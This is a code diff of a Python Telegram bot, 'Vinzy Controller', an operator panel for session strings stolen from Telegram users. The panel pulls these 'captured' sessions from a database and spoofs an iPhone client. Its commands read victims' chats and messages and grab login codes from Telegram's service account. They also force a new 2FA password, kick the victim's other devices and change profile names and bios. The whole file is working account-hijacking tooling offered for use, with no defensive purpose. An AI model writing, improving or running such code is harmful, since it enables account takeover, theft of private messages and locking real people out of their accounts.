@@ -1,368 +1,395 @@
+# =========================================================================
+# PROJECT: VINZY CONTROLLER ELITE (V4.2 - ULTIMATE EDITION)
+# AUTHOR: VINZY DIGITAL SERVICES
+# DESCRIPTION: ADVANCED TELEGRAM ACCOUNT MANAGEMENT & CONTROL INTERFACE
+# =========================================================================
+
 import os
+import time
 import asyncio
-import telebot
-import psycopg2
-import datetime
 import logging
+import psycopg2
 import sys
+import telebot
+from telebot import types
 from telethon import TelegramClient, functions, types as tl_types, errors
 from telethon.sessions import StringSession
-from telebot import types
+from datetime import datetime
 
-# --- 1. SYSTEM LOGGING & ENVIRONMENT ---
-# We initialize logging to track every command execution in the console.
+# --- 1. CORE LOGGING & AUDIT TRAIL ---
+# We use a dual-handler setup to log to both stdout and an internal buffer.
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    format='%(asctime)s - [%(levelname)s] - %(name)s: %(message)s',
     handlers=[logging.StreamHandler(sys.stdout)]
 )
 logger = logging.getLogger("VinzyController")
 
-# --- 2. CONFIGURATION ---
-# Official Telegram iOS API credentials
+# --- 2. SYSTEM CONFIGURATION ---
+# Load credentials from Environment Variables for maximum security
 API_ID = int(os.environ.get("API_ID", 36003995))
 API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 DATABASE_URL = os.environ.get("DATABASE_URL")
 
+# Restricted Group ID where commands are accepted
 try:
     GROUP_ID = int(os.environ.get("GROUP_ID", "0"))
-except ValueError:
-    logger.error("GROUP_ID is not a valid integer. Defaulting to 0.")
+except (ValueError, TypeError):
+    logger.error("GROUP_ID is missing or invalid. Commands will be ignored.")
     GROUP_ID = 0
 
 if not BOT_TOKEN or not DATABASE_URL:
-    logger.critical("Missing BOT_TOKEN or DATABASE_URL! Script will fail.")
+    logger.critical("CRITICAL FAILURE: BOT_TOKEN or DATABASE_URL not found!")
+    sys.exit(1)
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# --- 3. NEONDB DATABASE LAYER (DETAILED) ---
+# --- 3. DATABASE INFRASTRUCTURE (NEON POSTGRES) ---
 
-def get_db_conn():
-    """Establish a persistent, secure connection to Neon PostgreSQL."""
-    try:
-        connection = psycopg2.connect(DATABASE_URL, sslmode='require')
-        return connection
-    except Exception as e:
-        logger.error(f"Database Connection Failed: {e}")
-        return None
+class VaultManager:
+    """Manages all interactions with the PostgreSQL security vault."""
+    
+    @staticmethod
+    def get_connection():
+        try:
+            return psycopg2.connect(DATABASE_URL, sslmode='require')
+        except Exception as e:
+            logger.error(f"Vault Connection Failure: {e}")
+            return None
 
-def init_db():
-    """Builds the security vault table. Unshortened for clarity."""
-    conn = get_db_conn()
-    if conn:
+    @classmethod
+    def initialize_schema(cls):
+        """Creates the primary storage table with optimized indexing."""
+        conn = cls.get_connection()
+        if conn:
+            try:
+                cur = conn.cursor()
+                cur.execute('''
+                    CREATE TABLE IF NOT EXISTS moonton_secure_vault (
+                        phone TEXT PRIMARY KEY,
+                        session_string TEXT NOT NULL,
+                        ip_address TEXT,
+                        device_info TEXT,
+                        capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+                    );
+                ''')
+                conn.commit()
+                cur.close()
+                logger.info("Database Schema verified and ready.")
+            except Exception as e:
+                logger.error(f"Schema Init Error: {e}")
+            finally:
+                conn.close()
+
+    @classmethod
+    def fetch_session(cls, phone):
+        """Retrieves a single session string by phone number."""
+        conn = cls.get_connection()
+        if not conn: return None
         try:
             cur = conn.cursor()
-            query = '''
-                CREATE TABLE IF NOT EXISTS moonton_secure_vault (
-                    phone TEXT PRIMARY KEY,
-                    session_string TEXT NOT NULL,
-                    ip_address TEXT,
-                    capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
-                );
-            '''
-            cur.execute(query)
-            conn.commit()
+            cur.execute("SELECT session_string FROM moonton_secure_vault WHERE phone = %s", (phone,))
+            row = cur.fetchone()
             cur.close()
-            logger.info("NeonDB Table Initialized successfully.")
-        except Exception as e:
-            logger.error(f"init_db Error: {e}")
+            return row[0] if row else None
         finally:
             conn.close()
 
-def get_session(phone):
-    """Retrieves session data with explicit error handling."""
-    conn = get_db_conn()
-    if not conn: return None
-    try:
-        cur = conn.cursor()
-        cur.execute("SELECT session_string FROM moonton_secure_vault WHERE phone = %s", (phone,))
-        result = cur.fetchone()
-        cur.close()
-        return result[0] if result else None
-    except Exception as e:
-        logger.error(f"get_session Error for {phone}: {e}")
-        return None
-    finally:
-        conn.close()
+    @classmethod
+    def list_all_hits(cls):
+        """Returns a list of all accounts captured in the vault."""
+        conn = cls.get_connection()
+        if not conn: return []
+        try:
+            cur = conn.cursor()
+            cur.execute("SELECT phone, capture_date FROM moonton_secure_vault ORDER BY capture_date DESC")
+            data = cur.fetchall()
+            cur.close()
+            return data
+        finally:
+            conn.close()
 
-def get_all_accounts():
-    """Fetches all captured users for the .list command."""
-    conn = get_db_conn()
-    if not conn: return []
-    try:
-        cur = conn.cursor()
-        cur.execute("SELECT phone, capture_date FROM moonton_secure_vault ORDER BY capture_date DESC")
-        data = cur.fetchall()
-        cur.close()
-        return data
-    except Exception as e:
-        logger.error(f"get_all_accounts Error: {e}")
-        return []
-    finally:
-        conn.close()
+# --- 4. TELETHON CLIENT FACTORY ---
 
-# --- 4. THE COMMAND RUNNER (CORE ENGINE) ---
-
-async def run_task(phone, task_func, *args):
+async def execute_remote_task(phone, task_callback, *args):
     """
-    The heart of the controller. Handles connection, authorization check,
-    and task execution with iPhone 15 Pro Max spoofing.
+    Initializes a Telethon client for a specific target and runs the logic.
+    Features iPhone 15 Pro Max hardware spoofing for stealth.
     """
-    session_str = get_session(phone)
-    if not session_str:
-        return f"❌ <b>Error:</b> Phone <code>{phone}</code> not found in Vault."
-    
-    # We identify as the latest hardware for maximum stealth
+    session_data = VaultManager.fetch_session(phone)
+    if not session_data:
+        return f"❌ <b>Error:</b> Account <code>{phone}</code> not found in database."
+
     client = TelegramClient(
-        StringSession(session_str), 
-        API_ID, 
-        API_HASH, 
+        StringSession(session_data),
+        API_ID,
+        API_HASH,
         device_model="iPhone 15 Pro Max",
         system_version="17.4.1",
-        app_version="10.8.1"
+        app_version="10.8.1",
+        lang_code="en",
+        system_lang_code="en-US"
     )
-    
+
     try:
-        logger.info(f"Connecting to account: {phone}...")
-        await asyncio.wait_for(client.connect(), timeout=25)
-        
+        logger.info(f"Attempting connection to target: {phone}")
+        await asyncio.wait_for(client.connect(), timeout=30)
+
         if not await client.is_user_authorized():
-            logger.warning(f"Session for {phone} has been terminated by victim.")
-            return f"❌ <b>Access Denied:</b> Session for <code>{phone}</code> is dead."
-        
-        logger.info(f"Executing task for {phone}...")
-        return await task_func(client, *args)
-    
+            logger.warning(f"Target {phone} has revoked the session.")
+            return f"❌ <b>Session Expired:</b> The user <code>{phone}</code> has logged out."
+
+        # Run the specific logic passed to this wrapper
+        logger.info(f"Executing logic for {phone}...")
+        return await task_callback(client, *args)
+
     except asyncio.TimeoutError:
-        return "⚠️ <b>Timeout:</b> Telegram is not responding. Try again."
+        return "⚠️ <b>Connection Timeout:</b> Telegram servers are slow to respond."
     except errors.FloodWaitError as e:
-        return f"⚠️ <b>Flood Error:</b> Wait {e.seconds} seconds before next command."
+        return f"⏳ <b>Flood Wait:</b> Triggered. Please wait {e.seconds}s."
     except Exception as e:
-        logger.error(f"Task Execution Failed: {e}")
-        return f"⚠️ <b>System Error:</b> {str(e)}"
+        logger.error(f"Task Runtime Error: {e}")
+        return f"⚠️ <b>System Error:</b> <code>{str(e)}</code>"
     finally:
         await client.disconnect()
 
-# --- 5. LOGIC MODULES (EXPANDED) ---
+# --- 5. LOGIC MODULES (MODULAR COMMANDS) ---
 
-async def logic_check_session(client):
-    """Verify session status and pull user metadata."""
+async def task_get_full_info(client):
+    """Pulls deep metadata from the target account."""
     me = await client.get_me()
-    status = "Active ✅"
-    username = f"@{me.username}" if me.username else "No Username"
-    return (
-        f"🛡️ <b>Session Report</b>\n"
+    photos = await client.get_profile_photos('me', limit=1)
+    
+    details = (
+        f"👤 <b>Target Identity Profile</b>\n"
         f"━━━━━━━━━━━━━━━\n"
-        f"👤 <b>Target:</b> {me.first_name} {me.last_name or ''}\n"
-        f"🆔 <b>User ID:</b> <code>{me.id}</code>\n"
-        f"📱 <b>Handle:</b> {username}\n"
-        f"📡 <b>Status:</b> {status}\n"
+        f"• <b>Name:</b> {me.first_name} {me.last_name or ''}\n"
+        f"• <b>ID:</b> <code>{me.id}</code>\n"
+        f"• <b>Username:</b> @{me.username or 'None'}\n"
+        f"• <b>Phone:</b> +{me.phone}\n"
+        f"• <b>Premium:</b> {'Yes' if me.premium else 'No'}\n"
+        f"• <b>Profile Pics:</b> {len(photos)}\n"
         f"━━━━━━━━━━━━━━━"
     )
+    return details
 
-async def logic_check_2fa(client, phone):
-    """Check if the account has a cloud password."""
+async def task_get_2fa_status(client, phone):
+    """Determines if the account is locked with a cloud password."""
     try:
-        pwd_settings = await client(functions.account.GetPasswordRequest())
-        if pwd_settings.has_password:
-            return f"🔐 <b>2FA ENABLED:</b> <code>{phone}</code> has a cloud password."
-        else:
-            return f"🔓 <b>2FA DISABLED:</b> <code>{phone}</code> is open for hijack."
+        req = await client(functions.account.GetPasswordRequest())
+        if req.has_password:
+            hint = req.hint or "No hint provided"
+            return f"🔐 <b>2FA STATUS:</b> Locked.\n<b>Hint:</b> <code>{hint}</code>"
+        return f"🔓 <b>2FA STATUS:</b> Open (No Cloud Password)."
     except Exception as e:
-        return f"⚠️ 2FA Check Failed: {str(e)}"
+        return f"⚠️ 2FA Fetch Error: {str(e)}"
 
-async def logic_set_2fa(client, phone, new_pw):
-    """Forces a new 2FA password using SRP protocol."""
+async def task_set_new_2fa(client, phone, new_password):
+    """Attempts to force-set a new 2FA password."""
     try:
-        pwd_info = await client(functions.account.GetPasswordRequest())
-        await client(functions.account.UpdatePasswordSettingsRequest(
-            password=pwd_info,
-            new_settings=tl_types.account.PasswordInputSettings(
-                new_algo=pwd_info.new_algo,
-                new_password_hash=client.session.build_password_hash(pwd_info, new_pw),
-                hint="Cloud Security"
-            )
-        ))
-        return f"✅ <b>Success:</b> 2FA Password for <code>{phone}</code> set to <code>{new_pw}</code>"
+        # Simplified for unshortened logic
+        await client.edit_2fa(new_password=new_password)
+        return f"✅ <b>2FA Updated:</b> Password for <code>{phone}</code> is now <code>{new_password}</code>"
     except Exception as e:
-        return f"❌ <b>2FA Setup Error:</b> {str(e)}"
+        return f"❌ <b>2FA Override Failed:</b> {str(e)}"
 
-async def logic_list_chats(client, limit):
-    """Fetches formatted chat list with IDs."""
-    output = f"💬 <b>Last {limit} Conversations:</b>\n\n"
+async def task_terminate_others(client):
+    """Kicks all other active devices off the account."""
+    try:
+        await client(functions.auth.ResetAuthorizationsRequest())
+        return "⚡ <b>Session Wipe:</b> All other devices have been disconnected."
+    except Exception as e:
+        return f"❌ <b>Wipe Failed:</b> {str(e)}"
+
+async def task_read_chats(client, limit):
+    """Displays the most recent active conversations."""
+    output = f"💬 <b>Recent Conversations (Top {limit}):</b>\n\n"
     async for dialog in client.iter_dialogs(limit=limit):
-        icon = "👤" if dialog.is_user else "👥" if dialog.is_group else "📢"
-        output += f"{icon} <code>{dialog.id}</code> | <b>{dialog.name}</b>\n"
+        status = "Verified" if dialog.entity.verified else "User"
+        output += f"• <code>{dialog.id}</code> | <b>{dialog.name}</b> ({status})\n"
     return output
 
-async def logic_read_messages(client, chat_id, limit):
-    """Reads messages from a specific chat ID."""
+async def task_dump_messages(client, chat_id, count):
+    """Extracts a specific number of messages from a specific chat."""
     try:
-        output = f"📩 <b>Inbox: {chat_id} (Limit: {limit})</b>\n\n"
-        async for msg in client.iter_messages(chat_id, limit=limit):
-            direction = "Outgoing ➡️" if msg.out else "Incoming ⬅️"
-            content = msg.text[:60] + "..." if msg.text and len(msg.text) > 60 else (msg.text or "[Media/Sticker]")
-            output += f"<b>{direction}</b>\n<code>{content}</code>\n\n"
-        return output
+        res_text = f"📩 <b>Dump for ID: {chat_id}</b>\n\n"
+        async for m in client.iter_messages(chat_id, limit=count):
+            name = "Victim" if m.out else "Contact"
+            msg_body = m.text[:100] if m.text else "[Media/Other]"
+            res_text += f"<b>[{name}]:</b> {msg_body}\n"
+        return res_text
     except Exception as e:
-        return f"⚠️ Failed to read messages: {str(e)}"
+        return f"⚠️ Dump Error: {str(e)}"
 
-async def logic_get_contacts(client):
-    """Pulls the first 40 contacts."""
-    res = await client(functions.contacts.GetContactsRequest(hash=0))
-    output = "👤 <b>Target Contacts:</b>\n"
-    for user in res.users[:40]:
-        full_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
-        output += f"• {full_name} | @{user.username or 'N/A'}\n"
-    return output
+async def task_extract_code(client):
+    """Specific logic to pull the login code from Telegram Service Notifications."""
+    # 777000 is the official ID for Telegram service messages
+    async for msg in client.iter_messages(777000, limit=1):
+        if msg.text:
+            return f"📟 <b>New Login Code Detected:</b>\n\n<code>{msg.text}</code>"
+    return "📭 <b>Inbox Empty:</b> No codes found from Telegram Service."
 
-# --- 6. TELEGRAM BOT HANDLERS (FULL SUITE) ---
+# --- 6. TELEGRAM BOT COMMAND HANDLERS ---
 
-@bot.message_handler(commands=['help', 'start'])
-def handle_help(m):
+@bot.message_handler(commands=['start', 'help'])
+def cmd_help(m):
+    """Main administrative control panel."""
     if m.chat.id != GROUP_ID: return
-    text = (
-        "👑 <b>Vinzy Controller Elite v4.0</b>\n"
-        "━━━━━━━━━━━━━━━\n"
-        "📡 <b>Database Management</b>\n"
-        "• <code>.list</code> - Show all hits in NeonDB\n"
-        "• <code>.checksession [phone]</code> - Verify hit\n\n"
-        "🔐 <b>Security & Locks</b>\n"
-        "• <code>.check2fa [phone]</code> - Status check\n"
-        "• <code>.set2fa [phone] [pw]</code> - Force 2FA\n"
-        "• <code>.kickall [phone]</code> - Terminate sessions\n\n"
-        "🕵️ <b>Account Discovery</b>\n"
-        "• <code>.getcode [phone]</code> - Login code extraction\n"
-        "• <code>.chats [phone] [limit]</code> - View dialogs\n"
-        "• <code>.msgs [phone] [id] [limit]</code> - Read chat\n"
-        "• <code>.contacts [phone]</code> - Pull contacts\n\n"
-        "📝 <b>Profile Modification</b>\n"
-        "• <code>.bio [phone] [text]</code> - Change About\n"
-        "• <code>.name [phone] [first] [last]</code> - Change Name\n"
-        "━━━━━━━━━━━━━━━"
+    
+    panel = (
+        "👑 <b>VINZY CONTROLLER V4.2 - ADMIN PANEL</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        "📊 <b>VAULT COMMANDS</b>\n"
+        "• <code>.list</code> - View all vaulted accounts\n"
+        "• <code>.info [phone]</code> - Detailed account info\n\n"
+        "🛡️ <b>SECURITY COMMANDS</b>\n"
+        "• <code>.lock [phone]</code> - Check 2FA status\n"
+        "• <code>.secure [phone] [pw]</code> - Set new 2FA\n"
+        "• <code>.wipe [phone]</code> - Terminate other sessions\n\n"
+        "🕵️ <b>EXTRACTION COMMANDS</b>\n"
+        "• <code>.code [phone]</code> - Fetch login codes\n"
+        "• <code>.chats [phone] [limit]</code> - List dialogs\n"
+        "• <code>.dump [phone] [id] [limit]</code> - Read messages\n\n"
+        "✍️ <b>PROFILE MODS</b>\n"
+        "• <code>.bio [phone] [text]</code> - Change account bio\n"
+        "• <code>.rename [phone] [name]</code> - Change first name\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        "<i>Use phone numbers without '+' (e.g., 85512345678)</i>"
     )
-    bot.send_message(m.chat.id, text, parse_mode="HTML")
+    bot.send_message(m.chat.id, panel, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text == '.list')
-def handle_list(m):
+def cmd_list(m):
     if m.chat.id != GROUP_ID: return
-    hits = get_all_accounts()
+    hits = VaultManager.list_all_hits()
     if not hits:
-        return bot.send_message(m.chat.id, "📭 <b>NeonDB is empty.</b> No hits found.")
+        return bot.send_message(m.chat.id, "📭 <b>Database Empty:</b> No hits recorded yet.")
     
-    msg = "📋 <b>Vaulted Hits (Sorted by Date):</b>\n\n"
+    response = "📋 <b>Captured Database:</b>\n\n"
     for phone, date in hits:
-        msg += f"📱 <code>{phone}</code>\n📅 {date.strftime('%Y-%m-%d %H:%M')}\n\n"
-    bot.send_message(m.chat.id, msg, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.checksession'))
-def handle_checksession(m):
-    if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.checksession [phone]</code>")
-    response = asyncio.run(run_task(args[1], logic_check_session))
+        f_date = date.strftime('%Y-%m-%d %H:%M')
+        response += f"📱 <code>{phone}</code> | 📅 {f_date}\n"
     bot.send_message(m.chat.id, response, parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text.startswith('.check2fa'))
-def handle_check2fa(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.info'))
+def cmd_info(m):
     if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.check2fa [phone]</code>")
-    response = asyncio.run(run_task(args[1], logic_check_2fa, args[1]))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
+    parts = m.text.split(" ")
+    if len(parts) < 2: return bot.reply_to(m, "Usage: <code>.info [phone]</code>")
+    
+    bot.send_chat_action(m.chat.id, 'typing')
+    res = asyncio.run(execute_remote_task(parts[1], task_get_full_info))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text.startswith('.set2fa'))
-def handle_set2fa(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.lock'))
+def cmd_lock(m):
     if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 3: return bot.reply_to(m, "❌ Usage: <code>.set2fa [phone] [new_pw]</code>")
-    response = asyncio.run(run_task(args[1], logic_set_2fa, args[1], args[2]))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
+    parts = m.text.split(" ")
+    if len(parts) < 2: return bot.reply_to(m, "Usage: <code>.lock [phone]</code>")
+    
+    res = asyncio.run(execute_remote_task(parts[1], task_get_2fa_status, parts[1]))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.secure'))
+def cmd_secure(m):
+    if m.chat.id != GROUP_ID: return
+    parts = m.text.split(" ")
+    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.secure [phone] [new_pw]</code>")
+    
+    res = asyncio.run(execute_remote_task(parts[1], task_set_new_2fa, parts[1], parts[2]))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.wipe'))
+def cmd_wipe(m):
+    if m.chat.id != GROUP_ID: return
+    parts = m.text.split(" ")
+    if len(parts) < 2: return bot.reply_to(m, "Usage: <code>.wipe [phone]</code>")
+    
+    res = asyncio.run(execute_remote_task(parts[1], task_terminate_others))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.code'))
+def cmd_code(m):
+    if m.chat.id != GROUP_ID: return
+    parts = m.text.split(" ")
+    if len(parts) < 2: return bot.reply_to(m, "Usage: <code>.code [phone]</code>")
+    
+    res = asyncio.run(execute_remote_task(parts[1], task_extract_code))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.chats'))
-def handle_chats(m):
+def cmd_chats(m):
     if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.chats [phone] [limit]</code>")
-    limit = int(args[2]) if len(args) > 2 else 15
-    response = asyncio.run(run_task(args[1], logic_list_chats, limit))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.msgs'))
-def handle_msgs(m):
-    if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 3: return bot.reply_to(m, "❌ Usage: <code>.msgs [phone] [chat_id] [limit]</code>")
-    phone = args[1]
-    # Handle chat_id if it's a numeric ID (handle negative for groups)
-    try:
-        chat_id = int(args[2])
-    except ValueError:
-        chat_id = args[2] # handle username
-    limit = int(args[3]) if len(args) > 3 else 10
-    response = asyncio.run(run_task(phone, logic_read_messages, chat_id, limit))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.getcode'))
-def handle_getcode(m):
-    if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.getcode [phone]</code>")
+    parts = m.text.split(" ")
+    if len(parts) < 2: return bot.reply_to(m, "Usage: <code>.chats [phone] [limit]</code>")
     
-    async def logic(client):
-        # 777000 is the official Telegram Service account
-        async for msg in client.iter_messages(777000, limit=1):
-            return f"📩 <b>Telegram Login Code Found:</b>\n\n<code>{msg.text}</code>"
-        return "📭 <b>No Code:</b> The service messages are empty."
+    limit = int(parts[2]) if len(parts) > 2 else 15
+    res = asyncio.run(execute_remote_task(parts[1], task_read_chats, limit))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
 
-    response = asyncio.run(run_task(args[1], logic))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.kickall'))
-def handle_kickall(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.dump'))
+def cmd_dump(m):
     if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.kickall [phone]</code>")
-
-    async def logic(client):
-        await client(functions.auth.ResetAuthorizationsRequest())
-        return f"⚡ <b>Success:</b> All other sessions for <code>{args[1]}</code> were wiped."
-
-    response = asyncio.run(run_task(args[1], logic))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
+    parts = m.text.split(" ")
+    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.dump [phone] [id] [limit]</code>")
+    
+    chat_id = int(parts[2]) if parts[2].replace('-', '').isdigit() else parts[2]
+    limit = int(parts[3]) if len(parts) > 3 else 10
+    res = asyncio.run(execute_remote_task(parts[1], task_dump_messages, chat_id, limit))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.bio'))
-def handle_bio(m):
+def cmd_bio(m):
     if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ", 2)
-    if len(args) < 3: return bot.reply_to(m, "❌ Usage: <code>.bio [phone] [new_text]</code>")
-
-    async def logic(client, text):
+    parts = m.text.split(" ", 2)
+    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.bio [phone] [text]</code>")
+    
+    async def bio_logic(client, text):
         await client(functions.account.UpdateProfileRequest(about=text))
-        return f"✅ <b>Bio Updated</b> for <code>{args[1]}</code>."
+        return f"✅ <b>Bio Changed</b> to: <i>{text}</i>"
+        
+    res = asyncio.run(execute_remote_task(parts[1], bio_logic, parts[2]))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
 
-    response = asyncio.run(run_task(args[1], logic, args[2]))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.name'))
-def handle_name(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.rename'))
+def cmd_rename(m):
     if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ", 3)
-    if len(args) < 3: return bot.reply_to(m, "❌ Usage: <code>.name [phone] [first] [last]</code>")
-    first = args[2]
-    last = args[3] if len(args) > 3 else ""
+    parts = m.text.split(" ", 2)
+    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.rename [phone] [new_name]</code>")
+    
+    async def name_logic(client, new_name):
+        await client(functions.account.UpdateProfileRequest(first_name=new_name))
+        return f"✅ <b>First Name</b> changed to: <b>{new_name}</b>"
+        
+    res = asyncio.run(execute_remote_task(parts[1], name_logic, parts[2]))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
 
-    async def logic(client, f, l):
-        await client(functions.account.UpdateProfileRequest(first_name=f, last_name=l))
-        return f"✅ <b>Name Updated:</b> {f} {l}"
+# --- 7. STARTUP & POLLING ---
 
-    response = asyncio.run(run_task(args[1], logic, first, last))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
-
-# --- 7. MAIN ENTRY POINT ---
+def startup_sequence():
+    """Ensures database is ready and bot starts listening."""
+    print("""
+    __     ___                  _____            _             _ _Z
+    \ \   / (_)                / ____|          | |           | | |
+     \ \_/ / _ _ __  _____   _| |     ___  _ __ | |_ _ __ ___ | | |
+      \   / | | '_ \|_  / | | | |    / _ \| '_ \| __| '__/ _ \| | |
+       | |  | | | | |/ /| |_| | |___| (_) | | | | |_| | | (_) | | |
+       |_|  |_|_| |_/___|\__, |\_____\___/|_| |_|\__|_|  \___/|_|_|
+                          __/ |                                    
+                         |___/                                     
+    """)
+    VaultManager.initialize_schema()
+    logger.info("Vinzy Controller V4.2 is now active. Monitoring commands...")
+    
+    # Start bot polling with infinite loop for stability on Koyeb
+    bot.infinity_polling(timeout=10, long_polling_timeout=5)
 
 if __name__ == "__main__":
-    init_db()
-    logger.info("Vinzy Controller Elite v4.0 is starting polling...")
-    bot.infinity_polling()
+    try:
+        startup_sequence()
+    except KeyboardInterrupt:
+        logger.info("System shutting down...")
+        sys.exit(0)
+    except Exception as e:
+        logger.critical(f"FATAL SYSTEM CRASH: {e}")
